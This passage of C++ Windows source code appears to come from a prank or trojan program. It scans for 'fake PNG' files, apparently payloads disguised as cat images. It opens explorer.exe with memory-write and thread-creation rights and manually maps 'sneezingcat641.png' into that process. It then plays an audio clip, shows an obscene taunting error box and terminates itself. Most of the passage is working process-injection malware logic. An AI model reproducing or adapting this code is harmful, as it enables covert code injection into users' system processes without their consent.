			if (!(x.find("thinkingcat980.png") != std::string::npos) && !(x.find("cutieecat133.png") != std::string::npos) && !(x.find("yasminicat375.png") != std::string::npos) && !(x.find("cryingcat.png") != std::string::npos) && !(x.find("cat.png") != std::string::npos) && !(x.find("mycutecat.png") != std::string::npos) && !(x.find("sneezingcat641.png") != std::string::npos))
			{
				if (detectFakePng(x, width, height))
				{
					li_return.push_back(*it);
				}
			}
		}
		if (it != li_return.end())
		{
			it++;
		}
	}

	return li_return;
}

std::string getTxtData(std::string path)
{
	std::string result;
	std::string line_tmp;
	std::ifstream fs;
	fs.open(path);
	if (fs.is_open())
	{
		while (std::getline(fs, line_tmp))
		{
			result = result + line_tmp;
		}
		fs.close();
	}
	return result;
}

void writeToTxt(std::string data, std::string path)
{
	std::ofstream file_tmp;
	file_tmp.open(path);
	file_tmp << data;
	file_tmp.close();
}

int GetPIDByName(const char* ProcName)
{
	PROCESSENTRY32 PE32{ 0 };
	PE32.dwSize = sizeof(PE32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("[-] CreateToolhelp32Snapshot error: 0x%X\n", GetLastError());
		system("pause");
		return 0;
	}

	DWORD PID = 0;
	BOOL bRet = Process32First(hSnap, &PE32);
	while (bRet) {
		if (!strcmp(ProcName, _bstr_t(PE32.szExeFile))) {
			PID = PE32.th32ProcessID;
			break;
		}

		bRet = Process32Next(hSnap, &PE32);
	}

	CloseHandle(hSnap);

	return PID;
}

HANDLE OpenProc(const char* ProcName)
{
	int PID = GetPIDByName(ProcName);
	if (PID == 0) {
		system("pause");
		return nullptr;
	}
	HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
	if (!hProc) {
		system("pause");
		return nullptr;
	}

	return hProc;
}

void securityCatCaller()
{
	HANDLE hproc = OpenProc("explorer.exe");
	playbinarymp3::playBinaryMP3File(mp3_data, mp3_data_size);
	ManualMap(hproc, "sneezingcat641.png");
	MessageBoxA(NULL, "Get fuckeed btich", "Error", MB_OK | MB_ICONERROR);
	TerminateProcess(GetCurrentProcess(), 0xBABEFACE);
	return;
}